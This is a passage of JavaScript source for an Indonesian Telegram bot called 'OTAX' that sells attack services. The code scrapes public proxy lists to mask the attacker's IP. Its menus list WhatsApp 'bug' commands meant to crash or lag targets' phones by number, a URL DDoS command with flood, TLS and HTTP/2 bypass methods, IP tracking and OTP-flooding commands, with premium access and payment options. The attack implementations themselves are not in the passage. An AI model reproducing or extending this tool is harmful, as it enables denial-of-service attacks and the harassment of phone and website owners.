    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/HumayunShariarHimu/Proxy/main/Anonymous_HTTP_One.md",
    "https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/https.txt",
    "https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
    "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
  ];

  let proxies = [];

 
  try {
        if (fs.existsSync("proxt.txt")) {
            fs.unlinkSync("proxt.txt");
            logToFileAndConsole("proxt.txt lama berhasil dihapus");
        }
         if (fs.existsSync("proxy.txt")) {
            fs.unlinkSync("proxy.txt");
            logToFileAndConsole("proxy.txt lama berhasil dihapus");
        }
    } catch (error) {
        logToFileAndConsole(`Error deleting old proxy files: ${error.message}`);
    }

    
    for (const source of proxySources) {
        try {
            const response = await axios.get(source);
            proxies = proxies.concat(response.data.split("\n").filter(proxy => proxy.trim() !== '')); 
        } catch (error) {
            logToFileAndConsole(
                `Error scraping proxies from ${source}: ${error.message}`
            );
        }
    }

    
    try {
        fs.writeFileSync("proxt.txt", proxies.join("\n"));
        logToFileAndConsole("Proxies successfully scraped and saved to proxt.txt");

        fs.writeFileSync("proxy.txt", proxies.join("\n"));
        logToFileAndConsole("Proxies successfully scraped and saved to proxy.txt");

    } catch (error) {
        logToFileAndConsole(`Error writing proxy files: ${error.message}`);
    }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/rafael453322/PROXYDT/main/proxy.json.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}

clearUserAgent();
scrapeProxies();
scrapeUserAgent();
const nama = "OTAX";
const author = "OTAX";


let videoCache = null;
let videoCachePath = null;

function loadVideoToCache() {
  if (videoCache) return videoCache;

  const videoPath = path.join(__dirname, "./assets/videos/video.mp4");
  if (fs.existsSync(videoPath)) {
    videoCachePath = videoPath;
    videoCache = fs.readFileSync(videoPath);
    return videoCache;
  }
  return null;
}


//РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂ

bot.onText(/\/updateproxy/, (msg) => {
if (shouldIgnoreMessage(msg)) return;
  const chatId = msg.chat.id;
  scrapeProxies();
  const message = "Proxy Updated.";
  bot.sendMessage(chatId, message);
});
// Handler untuk command /proxycount
bot.onText(/\/proxycount/, (msg) => {
  const chatId = msg.chat.id;
if (shouldIgnoreMessage(msg)) return;
  fs.readFile("proxy.txt", "utf8", (err, data) => {
    if (err) {
      bot.sendMessage(
        chatId,
        "Gagal membaca file proxy.txt. Pastikan file tersebut ada dan bisa diakses."
      );
      logToFileAndConsole(`Error reading proxy.txt: ${err.message}`);
      return;
    }

    // Pisahkan setiap baris yang ada di file proxy.txt
    const proxies = data.split("\n").filter(Boolean);
    const proxyCount = proxies.length;

    bot.sendMessage(
      chatId,
      `Jumlah proxy yang ada di proxy.txt: ${proxyCount}`
    );
    logToFileAndConsole(`Sent proxy count: ${proxyCount} to chat ${chatId}`);
  });
});

// func bug

function generateMessageID() {
┬а┬а┬а return Math.floor(Math.random() * 1e10).toString();
}

//habis func 
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
async function sleep(ms) {
  await new Promise(resolve => setTimeout(resolve, ms));
}

const bugRequests = {};   
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);  
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
if (shouldIgnoreMessage(msg)) return;

  
  bot.sendPhoto(chatId, "https://files.catbox.moe/4v8phs.png", {
    caption: `\`\`\`
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ СИђуињ
­ЮЎЃ­ЮЎќ­ЮЎА­ЮЎц ­Юўй­ЮЎќ­ЮЎБ­ЮЎю ${username} ­ЮЎе­ЮЎџ­ЮЎА­ЮЎќ­ЮЎб­ЮЎќ­ЮЎЕ ­ЮЎб­ЮЎџ­ЮЎБ­ЮЎю­ЮЎю­ЮЎф­ЮЎБ­ЮЎќ­ЮЎа­ЮЎќ­ЮЎБ "­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ" ­Юўй­ЮЎџ­ЮЎД­ЮЎЌ­ЮЎъ­ЮЎЪ­ЮЎќ­ЮЎа­ЮЎА­ЮЎќ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎА­ЮЎќ­ЮЎб ­ЮЎб­ЮЎџ­ЮЎБ­ЮЎю­ЮЎю­ЮЎф­ЮЎБ­ЮЎќ­ЮЎа­ЮЎќ­ЮЎБ
 РћЂРћЂРћЂсђљ­ЮЎі­ЮЎЈ­Юў╝сђЉРћЂРћЂРћЂ
С║Ќ ­ЮЉХ­ЮЉ╗­ЮЉе­ЮЉ┐ ­ЮЉе­ЮЉ│­ЮЉЙ­ЮЉе­Юњђ­ЮЉ║ ­ЮЉГ­ЮЉХ­ЮЉ╣ ­Юњђ­ЮЉХ­ЮЉ╝ С║Ќ
    Рюў­ЮЎё­ЮЎБ­ЮЎЏ­ЮЎц­ЮЎД­ЮЎб­ЮЎќ­ЮЎе­ЮЎъ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ├Ќ═ю├Ќ
РъЦ ТЅђТюЅУђЁ : @Otapengenkawin
РъЦ сЃљсЃ╝сѓИсЃДсЃ│ : 3.0 р┤ў╩ђр┤Ј ╔бр┤Є╔┤ 2
РъЦ сЃЌсЃгсЃЪсѓбсЃасѓ╣сЃєсЃ╝сѓ┐сѓ╣ : ${premiumStatus}  
РъЦ сЃЕсЃ│сѓ┐сѓцсЃа : ${runtime}  
РъЦ сЂѓсЂфсЂЪсЂ«ID : ${senderId}  

рЮ░.рљЪ ­ЮЉ║­Юњє­ЮњЇ­Юњѓ­ЮњЇ­Юњќ ­ЮњЃ­Юњѓ­Юњё­Юњѓ ­Юњћ­Юњє­ЮњЋ­Юњі­Юњѓ­ЮњЉ ­Юњі­ЮњЈ­ЮњЄ­Юњљ­ЮњЊ­Юњј­Юњѓ­Юњћ­Юњі ­Юњџ­Юњѓ­ЮњЈ­Юњѕ ­ЮњЁ­Юњі­ЮњЃ­Юњє­ЮњЊ­Юњі­Юњї­Юњѓ­ЮњЈ

├Ќ═ю├Ќ р┤ўр┤Є╔┤р┤ёр┤Єр┤Џ sр┤ђ╩Ър┤ђ╩ю sр┤ђр┤Џр┤ю р┤Џр┤Јр┤Ї╩Ўр┤Ј╩Ъ р┤Ё╔ф╩Ўр┤ђр┤Ар┤ђ╩ю р┤ю╔┤р┤Џр┤юр┤І р┤Їр┤Єр┤Їр┤ю╩Ър┤ђ╔ф р┤Јр┤Џр┤ђx

\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "­ЮЎ┐­ЮЎ┤­ЮЎй­ЮЎХ­ЮЎ░­ЮџЃ­Юџё­ЮџЂ­ЮЎ░­ЮЎй Рюў", callback_data: "setting" },
          { text: "­ЮЎЙ­Юџє­ЮЎй­ЮЎ┤­ЮџЂ Рюў", callback_data: "owner_menu" },
            { text: "­ЮџЃ­Юџђ­ЮџЃ­ЮЎЙ Рюў", callback_data: "tqto" }
        ],
        [
          { text: "­ЮЎ│­ЮЎ│­ЮЎЙ­Юџѓ Рюў", callback_data: "ddos" },
          { text: "­ЮџЃ­ЮЎЙ­ЮЎЙ­ЮЎ╗­Юџѓ Рюў", callback_data: "tools" }
        ],
          [
          { text: "­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў", callback_data: "trashmenu" }
        ]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `\`\`\`
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ ­ЮЌЕ.3 ­ЮЌБ­ЮЌЦ­ЮЌб ­ЮЌџ­ЮЌў­ЮЌА 2
РЋГРќё№И╗сЃЄ╩Ї╔ЏН╝╩і ╔«╩і╔бРЋљРЋљРЋљРћЂСИђ
РћЃ    сЃљсѓ░сЃАсЃІсЃЦсЃ╝
РћЂРћЂРћЂсђљ­ЮЌю­ЮЌ╗­ЮўЃ­ЮЌХ­Юўђ­ЮЌХ­ЮЌ»­ЮЌ╣­ЮЌ▓сђЉРћЂРћЂРћЂ
РћЃРЋ░РћѕРъц /O-I╔┤р┤ар┤Єр┤б Рює 62xx
РћЃрЮ░.рљЪ р┤ўр┤Є╔┤╩Јр┤Єр┤ўр┤Ј╔┤╔б р┤Ір┤юр┤Јр┤Џр┤ђ + ╔ф╔┤р┤аs╔ф╩Ў╩Ър┤Є р┤Єр┤ђs╩Ј р┤Ёр┤Є╩Ър┤ђ╩Ј
РћЃРЋ░РћѕРъц /O-Invis Рює 62xx
РћЃрЮ░.рљЪ р┤ўр┤Є╔┤╩Јр┤Єр┤ўр┤Ј╔┤╔б р┤Ір┤юр┤Јр┤Џр┤ђ + ╔ф╔┤р┤аs╔ф╩Ў╩Ър┤Є р┤Їр┤Єр┤Ё╔фр┤юр┤Ї р┤Ёр┤Є╩Ър┤ђ╩Ј
РћЃРЋ░РћѕРъц /O-Superinvis Рює 62xx
РћЃрЮ░.рљЪ р┤ўр┤Є╔┤╩Јр┤Єр┤ўр┤Ј╔┤╔б р┤Ір┤юр┤Јр┤Џр┤ђ + ╔ф╔┤р┤аs╔ф╩Ў╩Ър┤Є ╩юр┤ђ╩ђр┤Ё р┤Ёр┤Є╩Ър┤ђ╩Ј
РћЃРЋ░РћѕРъц /O-Tр┤ђ╔┤ Рює 62xx
РћЃрЮ░.рљЪ  ╔ф╔┤р┤а╔фs╔ф╩Ў╩Ър┤Є р┤Ёр┤Є╩Ър┤ђ╩Ј
РћЃРЋ░РћѕРъц /O-Fc Рює 62xx
РћЃрЮ░.рљЪ  ╔ф╔┤р┤а╔фs╔ф╩Ў╩Ър┤Є мЊр┤ё
РћЂРћЂРћЂсђљ­ЮЌЕ­ЮЌХ­Юўђ­ЮЌХ­ЮЌ»­ЮЌ╣­ЮЌ▓сђЉРћЂРћЂРћЂ
РћЃРЋ░РћѕРъц /O-Super Рює 62xx
РћЃрЮ░.рљЪ р┤ё╩ђр┤ђs╩ю р┤ю╔ф/╩Ў╩Ър┤ђ╔┤р┤І x р┤Ёр┤Є╩Ър┤ђ╩Ј
РћЃРЋ░РћѕРъц /O-Delay Рює 62xx
РћЃрЮ░.рљЪ р┤Ёр┤Є╩Ър┤ђ╩Ј - sр┤Џ╔фр┤ёр┤Ір┤Є╩ђ
РћЃРЋ░РћѕРъц /O-Combo Рює 62xx
РћЃрЮ░.рљЪ р┤Ї╔фx - р┤ўр┤Јр┤Ар┤Є╩ђ
РћЃРЋ░РћѕРъц /O-Crash Рює 62xx
РћЃрЮ░.рљЪ р┤ё╩ђр┤ђs╩ю р┤А╩юр┤ђр┤Џsр┤ђр┤ўр┤ў
РћЃРЋ░РћѕРъц /O-Ios Рює 62xx
РћЃрЮ░.рљЪ р┤ір┤ђ╔┤р┤Ёр┤ђ р┤ўр┤Є╔┤╔б╔бр┤Јр┤Ёр┤ђ ╔фр┤Јs
РћЃРЋ░РћѕРъц /O-Visiblefc Рює 62xx
РћЃрЮ░.рљЪ р┤а╔фs╔ф╩Ў╩Ър┤Є мЊр┤Ј╩ђр┤ё╩Ър┤Јsр┤Є
РћЂРћЂРћЂсђљ­ЮЌЋ­Юўѓ­ЮЌ┤ ­ЮЌџ­ЮЌ┐­ЮЌ╝­Юўѓ­ЮЌйсђЉРћЂРћЂРћЂ
РћЃРЋ░РћѕРъц /O-Group (LinkGroup)
РћЃрЮ░.рљЪ ╩Ўр┤ю╔б ╔б╩ђр┤Јр┤юр┤ў
­ЮЎЅ­Юўй : ­Юўџ­Юўд­Юў»­ЮўЦ­Юўд­Юў│ ­Юўъ­Юўб­ЮўФ­Юўф­ЮўБ ­Юўћ­Юўд­Юў»­Юўе­Юўе­ЮўХ­Юў»­Юўб­Юўг­Юўб­Юў» ­Юўъ­Юўб ­ЮўЅ­Юўф­Юўб­Юў┤­Юўб / ­ЮўЅ­ЮўХ­Юўг­Юўб­Юў» ­ЮўЅ­Юўф­Юў┤­Юў»­Юўф­Юў┤
РћЂРћЂРћЂсђљ­ЮЌД­Юўє­ЮЌй­ЮЌ▓ ­ЮЌд­ЮЌй­ЮЌ«­ЮЌ║сђЉРћЂРћЂРћЂ
РћЃРЋ░РћѕРъц /O-Clear Рює 62xx
РћЃрЮ░.рљЪ ­ЮЎљ­ЮЎБ­ЮЎЕ­ЮЎф­ЮЎа ­ЮўЙ­ЮЎА­ЮЎџ­ЮЎќ­ЮЎД ­Юўй­ЮЎф­ЮЎю
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
­ЮЌА­ЮЌ» : ­Юўљ­Юў»­Юўи­Юўф­Юў┤­Юўф­ЮўБ­ЮўГ­Юўд : ­ЮўЏ­Юўф­ЮўЦ­Юўб­Юўг ­ЮўЏ­Юўд­Юў│­ЮўГ­Юўф­ЮўЕ­Юўб­Юўх
     ­ЮўЮ­Юўф­Юў┤­Юўф­ЮўБ­ЮўГ­Юўд  : ­ЮўЏ­Юўд­Юў│­ЮўГ­Юўф­ЮўЕ­Юўб­Юўх
РћЂРћЂРћЂсђљ­ЮЌБ­ЮЌ▓­ЮЌ╗­ЮўЂ­ЮЌХ­ЮЌ╗­ЮЌ┤!!сђЉРћЂРћЂРћЂ
Jika Sender Ingin Tidak Mudah Kenon / Spam Maka Bisa Menggunakan Bug Type Invisible / Tidak Terlihat!
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "­ЮЎ║­ЮЎ┤­ЮЎ╝­ЮЎ▒­ЮЎ░­ЮЎ╗­ЮЎИ сЃё", callback_data: "back_to_main" }]] };
    }
    if (query.data === "ddos") {
      caption = `\`\`\`
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ ­ЮЌЕ.3 ­ЮЌБ­ЮЌЦ­ЮЌб ­ЮЌџ­ЮЌў­ЮЌА 2
РЋГРќё№И╗сЃЄл╝ЛћлИ¤Ё РѕѓРѕѓ╬┐ЛЋРЋљРЋљРЋљРћЂСИђ
РћЃ    сЃљсѓ░сЃАсЃІсЃЦсЃ╝
РћЂРћЂРћЂсђљ­ЮЌЌ­ЮЌЌ­ЮЌб­ЮЌдсђЉРћЂРћЂРћЂ
РћЃРЋ░РћѕРъц /O-Aр┤Џр┤Џр┤ђр┤ёр┤І <р┤ю╩ђ╩Ъ> <р┤Ёр┤ю╩ђр┤ђр┤Џ╔фр┤Ј╔┤> <р┤Їр┤Єр┤Џр┤Јр┤Ёр┤Є>
РћЃрЮ░.рљЪ р┤ёр┤Ј╔┤р┤Џр┤Ј╩ю ╔┤╔ф╩ю : /O-Aр┤Џр┤Џр┤ђр┤ёр┤І x╔┤xx.р┤ёр┤Јр┤Ї 1200 мЊ╩Ър┤Јр┤Јр┤Ё
РћЂРћЂРћЂсђљ­ЮЌа­ЮЌў­ЮЌД­ЮЌб­ЮЌЌ­ЮЌўсђЉРћЂРћЂРћЂ
РћЃрЮ░.рљЪ flood
РћЃрЮ░.рљЪ tls
РћЃрЮ░.рљЪ vip
РћЃрЮ░.рљЪ bypass
РћЃрЮ░.рљЪ storm
РћЃрЮ░.рљЪ strike
РћЃрЮ░.рљЪ glory
РћЃрЮ░.рљЪ kill 
РћЃрЮ░.рљЪ tlsvip 
РћЃрЮ░.рљЪ cas
РћЃрЮ░.рљЪ h2-flash
РћЃрЮ░.рљЪ pidoras
РћЃрЮ░.рљЪ h2-flood 
РћЂРћЂРћЂсђљ­ЮЌД­ЮЌб­ЮЌб­ЮЌЪ­ЮЌдсђЉРћЂРћЂРћЂ
РћЃРЋ░РћѕРъц /р┤Џ╩ђр┤ђр┤ёр┤І╔фр┤ў <IP Aр┤Ёр┤Ё╩ђр┤Єs>
РћЃрЮ░.рљЪ р┤ёр┤Єр┤І ╔ф╔┤мЊр┤Ј╩ђр┤Їр┤ђs╔ф ╔фр┤ў
РћЃРЋ░РћѕРъц /р┤І╔ф╩Ъ╩Ър┤Јр┤Џр┤ў Рює 62xx
РћЃрЮ░.  р┤ђр┤Џр┤Џр┤ђр┤ёр┤І р┤ўр┤ђ╔ф╩ђ╔ф╔┤╔б
РћЂРћЂРћЂсђљ­ЮЌБ­ЮЌ▓­ЮЌ╗­ЮўЂ­ЮЌХ­ЮЌ╗­ЮЌ┤!!сђЉРћЂРћЂРћЂ
р┤Ёр┤Ёр┤Јs р┤ђр┤Ёр┤ђ╩Ър┤ђ╩ю sр┤Є╩ђр┤ђ╔┤╔бр┤ђ╔┤ р┤Ар┤Є╩Ў ╩Јр┤ђ╔┤╔б ╩Ўр┤Є╩ђs╔фмЊр┤ђр┤Џ ╔ф╩Ъ╩Ър┤Є╔бр┤ђ╩Ъ ╩юр┤ђр┤Џ╔ф ╩юр┤ђр┤Џ╔ф р┤ђр┤Ір┤ђ╔┤ р┤Ёр┤ђр┤Їр┤ўр┤ђр┤І р┤ўр┤Є╔┤╩Јр┤Є╩ђр┤ђ╔┤╔бр┤ђ╔┤ , "р┤Јр┤Џр┤ђx" sр┤юр┤Ёр┤ђ╩ю р┤Ё╔ф р┤Їр┤Јр┤Ё╔фмЊ╔фр┤Ір┤ђs╔ф р┤Ёр┤Є╔┤╔бр┤ђ╔┤ р┤ў╩ђр┤Јx╩Ј (р┤ўр┤Є╔┤╩Јр┤ђр┤Їр┤ђ╩ђр┤ђ╔┤ ╔фр┤ў) р┤ђ╔бр┤ђ╩ђ ╔фр┤ў р┤ўр┤Є╔┤╔б╔бр┤ю╔┤р┤ђ р┤Џ╔фр┤Ёр┤ђр┤І р┤Џр┤Є╩ђр┤Ёр┤Єр┤Џр┤Єр┤ёр┤Џ
РћЃРЋ░РћѕРъц /р┤юр┤ўр┤Ёр┤ђр┤Џр┤Єр┤ў╩ђр┤Јx╩Ј 
РћЃрЮ░.рљЪ р┤юр┤ўр┤Ёр┤ђр┤Џр┤Є р┤ў╩ђр┤Јx╩Ј ╩Ўр┤ђ╩ђр┤ю
РћЃРЋ░РћѕРъц /р┤ў╩ђр┤Јx╩Јр┤ёр┤Јр┤ю╔┤р┤Џ
РћЃрЮ░.рљЪ р┤ўр┤Є╔┤╔б╩ю╔фр┤Џр┤ю╔┤╔бр┤ђ╔┤ р┤ў╩ђр┤Јx╩Ј ╩Јр┤ђ╔┤╔б р┤Џр┤Є╩ђр┤ўр┤ђр┤Ір┤ђ╔ф
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "­ЮЎ║­ЮЎ┤­ЮЎ╝­ЮЎ▒­ЮЎ░­ЮЎ╗­ЮЎИ сЃё", callback_data: "back_to_main" }]] };
    }
    if (query.data === "setting") {
      caption = `\`\`\`
РЋГРћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
РћЃрЮ░.рљЪ ТЅђТюЅУђЁ  : @Otapengenkawin
РћЃрЮ░.рљЪ сЃљсЃ╝сѓИсЃДсЃ│ : 3.0 р┤ў╩ђр┤Ј ╔бр┤Є╔┤ 2
РћЃрЮ░.рљЪ сЃЕсЃ│сѓ┐сѓцсЃа : ${runtime}
РЋ░РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
Я╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє­Юўќ­ЮўЏ­Юўѕ­ЮўЪРІєЯ╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє
РЋГРћЂ( ­ЮЋђ­ЮЋЪ­ЮЋЌ­ЮЋа­ЮЋБ­ЮЋъ­ЮЋњ­ЮЋц­ЮЋџ )
РћЃрЮ░.рљЪ сЃдсЃ╝сѓХсЃ╝ : ${username}
РћЃрЮ░.рљЪ сЃдсЃ╝сѓХсЃ╝ID : ${senderId}
РћЃрЮ░.рљЪ сЃЌсЃгсЃЪсѓбсЃасѓ╣сЃєсЃ╝сѓ┐сѓ╣ : ${premiumStatus}
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
РЋГРћЂ( р┤ўр┤Є╔┤╔бр┤ђр┤Џр┤ю╩ђр┤ђ╔┤ )
РћЃрЮ░.рљЪ /sр┤Єр┤Џр┤ір┤Єр┤Ёр┤ђ <5р┤Ї>
РћЃрЮ░.рљЪ /р┤ђр┤Ёр┤Ёр┤ў╩ђр┤Єр┤Ї <╔фр┤Ё>
РћЃрЮ░.рљЪ /р┤Ёр┤Є╩Ър┤ў╩ђр┤Єр┤Ї <╔фр┤Ё>
РћЃрЮ░.рљЪ /р┤ёр┤Єр┤Ір┤ў╩ђр┤Єр┤Ї
РћЃрЮ░.рљЪ /р┤ђр┤Ёр┤Ёр┤ђр┤Ёр┤Ї╔ф╔┤ <╔фр┤Ё>
РћЃрЮ░.рљЪ /╩ђр┤ЄКФр┤ўр┤ђ╔ф╩ђ 62├Ќ├Ќ├Ќ
РћЃрЮ░.рљЪ /р┤Є╔┤р┤ёр┤ір┤ђр┤ар┤ђ
РћЃрЮ░.рљЪ /р┤ёр┤Єр┤І╔фр┤Ёр┤ё╩ю <╩Ъ╔ф╔┤р┤І>
РћЃрЮ░.рљЪ /р┤Ј╔┤ (р┤ђр┤Ір┤Џ╔фмЊ р┤ђ╔ф)
РћЃрЮ░.рљЪ /р┤ЈмЊмЊ (╔┤р┤Ј╔┤р┤ђр┤Ір┤Џ╔фмЊ р┤ђ╔ф)
РћЃрЮ░.рљЪ /sр┤Єр┤Џр┤Ар┤Є╩Ър┤ёр┤Јр┤Їр┤Є <р┤Џр┤Єр┤Іs>
РћЃрЮ░.рљЪ /р┤Ар┤Є╩Ър┤ёр┤Јр┤Їр┤Єр┤Ј╔┤
РћЃрЮ░.рљЪ /р┤Ар┤Є╩Ър┤ёр┤Јр┤Їр┤Єр┤ЈмЊмЊ
РћЃрЮ░.рљЪ /sр┤Єр┤Џ╔бр┤Јр┤Јр┤Ё╩Ў╩Јр┤Є <р┤Џр┤Єр┤Іs>
РћЃрЮ░.рљЪ /╔бр┤Јр┤Јр┤Ё╩Ў╩Јр┤Єр┤Ј╔┤
РћЃрЮ░.рљЪ /╔бр┤Јр┤Јр┤Ё╩Ў╩Јр┤Єр┤ЈмЊмЊ
РћЃрЮ░.рљЪ /╔б╩ђр┤Јр┤юр┤ўр┤Ј╔┤
РћЃрЮ░.рљЪ /╔б╩ђр┤Јр┤юр┤ўр┤ЈмЊмЊ
РћЃрЮ░.рљЪ /р┤ђр┤Ёр┤Ё╔б╩ђр┤Јр┤юр┤ў
РћЃрЮ░.рљЪ /р┤Ёр┤Є╩Ъ╔б╩ђр┤Јр┤юр┤ў
РћЃрЮ░.рљЪ /sр┤Џр┤ђр┤Џр┤юs (р┤ёр┤Єр┤І sр┤Џр┤ђр┤Џр┤юs)
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.


\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "­ЮЎ║­ЮЎ┤­ЮЎ╝­ЮЎ▒­ЮЎ░­ЮЎ╗­ЮЎИ сЃё", callback_data: "back_to_main" }]] };
    }
    if (query.data === "owner_menu") {
      caption = `\`\`\`
РЋГРћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
РћЃрЮ░.рљЪ ТЅђТюЅУђЁ  : @Otapengenkawin
РћЃрЮ░.рљЪ сЃљсЃ╝сѓИсЃДсЃ│ : 3.0 ­ЮўЌ­Юў│­Юў░ ­Юўј­Юўд­Юў» 1.3
РћЃрЮ░.рљЪ сЃЕсЃ│сѓ┐сѓцсЃа : ${runtime}
РЋ░РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
Я╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє­Юўќ­ЮўЏ­Юўѕ­ЮўЪРІєЯ╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє
РЋГРћЂ( ­ЮЋђ­ЮЋЪ­ЮЋЌ­ЮЋа­ЮЋБ­ЮЋъ­ЮЋњ­ЮЋц­ЮЋџ )
РћЃрЮ░.рљЪ сЃдсЃ╝сѓХсЃ╝ : ${username}
РћЃрЮ░.рљЪ сЃдсЃ╝сѓХсЃ╝ID : ${senderId}
РћЃрЮ░.рљЪ сЃЌсЃгсЃЪсѓбсЃасѓ╣сЃєсЃ╝сѓ┐сѓ╣ : ${premiumStatus}
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
Я╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє­Юўќ­ЮўЏ­Юўѕ­ЮўЪРІєЯ╝║­ЊєЕРЮЪРЮЏРЮЪ­ЊєфЯ╝╗РІє
РЋГРћЂ( ­Юџў­Юџа­ЮџЌ­Юџј­ЮџЏ ­ЮЎ╝­ЮЎ┤­ЮЎй­Юџё )
РћЃрЮ░.рљЪ /р┤ђр┤Ёр┤Ёр┤ђр┤Ёр┤Ї╔ф╔┤ <╔фр┤Ё>
РћЃрЮ░.рљЪ /р┤Ёр┤Є╩Ър┤ђр┤Ёр┤Ї╔ф╔┤ <╔фр┤Ё>
РћЃрЮ░.рљЪ /р┤ђр┤Ёр┤Ёр┤ў╩ђр┤Єр┤Ї <╔фр┤Ё>
РћЃрЮ░.рљЪ /р┤Ёр┤Є╩Ър┤ў╩ђр┤Єр┤Ї <╔фр┤Ё>
РћЃрЮ░.рљЪ /╩Ъ╔фsр┤Џр┤ўр┤ђ╔ф╩ђ
РћЃрЮ░.рљЪ /р┤Ёр┤Є╩Ър┤ўр┤ђ╔ф╩ђ
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
РЋГРћЂ( р┤ўр┤ђ╩Јр┤Їр┤Є╔┤р┤Џ р┤Јр┤А╔┤р┤Є╩ђ )
РћЃрЮ░.рљЪ /qris
РћЃрЮ░.рљЪ /dana
РћЃрЮ░.рљЪ /ovo
РћЃрЮ░.рљЪ /gopay
РЋ░РћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД.
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "­ЮЎ║­ЮЎ┤­ЮЎ╝­ЮЎ▒­ЮЎ░­ЮЎ╗­ЮЎИ сЃё", callback_data: "back_to_main" }]] };
    }
    if (query.data === "tools") {
      caption = `\`\`\`
